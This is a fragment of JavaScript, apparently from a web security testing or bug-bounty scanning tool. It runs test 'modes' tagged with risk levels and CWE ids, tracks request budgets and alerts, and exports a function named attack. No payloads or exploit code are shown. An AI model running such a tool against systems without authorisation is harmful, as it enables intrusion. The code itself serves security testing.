    envs.set(ctx, env);
    if (log) log('▸ ' + k + ' (' + meta.riskLevel + ')');
    try { await EXEC[k](ctx); } catch (e) { ctx.note('erreur : ' + (e.message || e)); }
    out.push({ mode: k, riskLevel: meta.riskLevel, cwe: meta.cwe, reqs: ctx.reqs, alerts: ctx.alerts, notes: ctx.notes });
  }
  envs.clear();
  if (log) log('▸ ' + env.reqs + ' requetes (P1 ' + (pools.P1 - remaining.P1) + '/' + pools.P1 + ' P2 ' + (pools.P2 - remaining.P2) + '/' + pools.P2 + ' P3 ' + (pools.P3 - remaining.P3) + '/' + pools.P3 + ')');
  const alerts = out.flatMap(m => m.alerts || []);
  return {
    ts: new Date().toISOString(), ms: Date.now() - T0, host, program: prog.id,
    budget: pools, used: env.reqs, remaining,
    modes: out, alerts,
  };
}

module.exports = { attack, advancedRun, areq };